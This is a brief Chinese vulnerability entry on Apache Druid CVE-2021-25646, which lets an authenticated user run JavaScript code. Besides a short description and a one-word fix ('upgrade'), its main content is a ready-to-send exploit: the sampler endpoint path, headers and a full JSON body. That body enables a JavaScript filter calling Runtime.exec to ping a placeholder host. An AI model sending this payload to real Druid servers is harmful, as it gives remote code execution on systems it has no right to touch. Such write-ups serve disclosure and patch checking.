### 一 漏洞描述
Apache Druid是一个实时分析数据库，旨在对大型数据集进行快速的切片和切分分析（“ OLAP ”查询）。  
德鲁伊最常用作数据库，以支持对实时摄取，快速查询性能和高正常运行时间很重要的用例。  
因此，Druid通常用于为分析应用程序的GUI供电，或用作需要快速聚合的高并发API的后端。德鲁伊最适合面向事件的数据。

Apache Druid 包括执行嵌入在各种类型请求中的用户提供的 JavaScript 代码的能力。  
此功能旨在用于高信任环境，默认情况下处于禁用状态。  
但是，在 Druid 0.20.0 及更早版本中，经过身份验证的用户可以发送特制的请求，强制 Druid 为该请求运行用户提供的 JavaScript 代码，而不管服务器配置如何。

### 二 漏洞利用
```
header = {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json;charset=UTF-8'
}
path = "/druid/indexer/v1/sampler?for=filter"
post = {"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\\"isRobot\\":true,\\"channel\\":\\"#x\\",\\"timestamp\\":\\"2020-12-12T12:10:21.040Z\\",\\"flags\\":\\"x\\",\\"isUnpatrolled\\":false,\\"page\\":\\"1\\",\\"diffUrl\\":\\"https://xxx.com\\",\\"added\\":1,\\"comment\\":\\"Botskapande Indonesien omdirigering\\",\\"commentLength\\":35,\\"isNew\\":true,\\"isMinor\\":false,\\"delta\\":31,\\"isAnonymous\\":true,\\"user\\":\\"Lsjbot\\",\\"deltaBucket\\":0,\\"deleted\\":0,\\"namespace\\":\\"Main\\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('ping -c1 %s')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
```

### 三 漏洞修复
升级

> 参考链接  
> https://blog.csdn.net/weixin_45883933/article/details/109725987  
> https://druid.apache.org/  
> https://github.com/apache/druid  
> https://nvd.nist.gov/vuln/detail/CVE-2021-25646
